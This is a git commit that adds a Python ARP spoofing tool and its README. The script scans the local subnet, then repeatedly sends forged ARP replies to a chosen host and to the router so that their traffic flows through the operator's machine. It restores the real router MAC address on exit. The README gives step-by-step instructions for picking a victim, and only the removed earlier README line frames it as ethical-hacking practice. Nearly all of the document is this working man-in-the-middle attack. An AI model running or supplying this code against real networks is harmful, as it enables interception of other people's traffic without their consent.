d9b2cbaaad87f695ffd0a8058694f2968ef39e8d
Itamar2562 <zzitamar66@gmail.com>
2025-07-27 00:06:24 +0300

    Add files via upload

---
+++ ArpSpoofProject.py
@@ -0,0 +1,105 @@
+
+import multiprocessing
+from getmac import get_mac_address
+import scapy.all as scapy
+import time
+
+#function to get the subnet mask in CIDR notation of ip/mask
+def GetMask() ->str:
+    try:
+        subnet_mask = input("enter the subnet mask (e.g. 255.255.255.0 or 1-32): ")
+        if subnet_mask.count(".") != 3 and int(subnet_mask)<= 32 and int(subnet_mask) >= 0:
+            return subnet_mask
+        subnet_mask = subnet_mask.split(".")
+        maskCounter = 0
+        for i in range(len(subnet_mask)):
+            bin_num = bin(int(subnet_mask[i])).replace("0b", "")
+            for j in range(len(str(bin_num))):
+                if bin_num[j] == '1':
+                    maskCounter += 1
+                else:
+                    break
+    except ValueError:
+        print("Invalid subnet mask format. Please enter a valid subnet mask.")    
+        return GetMask()   
+    return str(maskCounter)
+    
+        
+#scans the network for devices and stores their IP and MAC addresses in a ditionary
+def scan(Default, Targetdict,mask, my_ip):
+    print("the routers mac: ",Default+"/"+mask)
+    response,_= scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=defaultGatway+"/"+mask), timeout=4, verbose=0)
+    for packet in response:
+        # If the response contains an answer, extract the IP and MAC address
+        if packet.answer.psrc==my_ip or packet.answer.psrc==Default:
+            continue
+        Targetdict[packet.answer.psrc] = packet.answer.hwsrc
+     
+
+
+    #pdst: target IP address 
+    #hwdst:target mac address
+    #psrc: source IP address
+    #hwsrc: source mac address
+    #sendp is used to send packets in layer 2 (Ethernet)
+    #mac/ip
+def spoof(Target_ip, Target_mac,Src_ip, verbose):
+    self_mac = scapy.get_if_hwaddr(scapy.conf.iface)
+    print("self mac: " + self_mac)
+    arp_response = scapy.ARP(pdst=Target_ip, hwdst=Target_mac, psrc=Src_ip, op='is-at',) 
+    ether = scapy.Ether(dst=Target_mac)
+    packet = ether / arp_response
+    print("currently spoofing: " + Target_ip + " with " + self_mac + " as the source MAC address")
+    while True:
+        # Continuously send ARP responses to spoof the target
+        try:
+            scapy.sendp(packet, count=2,  verbose=0)
+            time.sleep(2)  # Sleep to avoid flooding the network
+        except KeyboardInterrupt:
+            if(verbose):
+                print(f"Sent ARP response: {Src_ip}:is-at {self_mac} to disable {Target_ip}")
+                break
+
+def restore(Router_ip, verbose):
+    router_mac = get_mac_address(ip=Router_ip)
+    arp_response=scapy.ARP(hwdst="ff:ff:ff:ff:ff:ff", psrc=Router_ip, hwsrc=router_mac, op='is-at')    
+    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    packet = ether / arp_response
+    scapy.sendp(packet, count=8, verbose=0)
+    if(verbose):
+        print(f"Sent broadcast ARP response: {Router_ip} is-at {router_mac} ")
+
+
+
+if __name__ == "__main__":
+    defaultGatway = input("Enter the default gateway: ")
+    Router_mac = get_mac_address(ip=defaultGatway)
+    mask = GetMask()
+    network=defaultGatway.split(".")
+    networkNums=network[0]+"."+network[1]+"."+network[2]+"."
+    network=defaultGatway.split(".")
+    manager = multiprocessing.Manager()
+    Targetdict = manager.dict()
+    my_ip = scapy.get_if_addr(scapy.conf.iface)
+    scan(defaultGatway, Targetdict, mask, my_ip)
+
+    print("Live device found: ")
+    for key,value in Targetdict.items():
+       print(f"IP: {key}, MAC: {value}")
+
+    try:
+        while True:
+            key= input("Enter the target IP address to spoof (or 'cntl c' to quit): ")
+            value= Targetdict[key]        
+            p1=multiprocessing.Process(target=spoof, args=[key,value,defaultGatway,True])      
+            p2=multiprocessing.Process(target=spoof, args=[defaultGatway,Router_mac,key,True])
+            p1.start()
+            p2.start()
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("cntl c was pressed, stopping ARP spoofing..")
+        restore(defaultGatway,True)
+
+
+
+
--- README.md
+++ README.md
@@ -1,2 +1,19 @@
-# ArpSpoofPro
-A simple ARP spoofing tool developed for ethical hacking practice and self-learning in network security.
+arp spoofing tool that sends arp to the router and target in order to make them send massages to you.
+
+How to use:
+    start the program and follow the instructions.
+    1.enter default gatway (router's IP).
+    2.enter subnet mask (in CIDR Notation or dotted decimal Format).
+    3.enter the ip of whoever you would like to spoof.
+    4.KeyboardInterrupt (usually ctnl C) to finish spoofing and restore connection.
+
+libraries:
+    -scapy used to craft and send the arp packets.
+    -getmac used to get the mac adress using IP.
+    -time. 
+    -multiprocessing.
+
+Dependencies:
+    you will need to install scapy and getmac using pip:
+    pip install scapy
+    pip install getmac
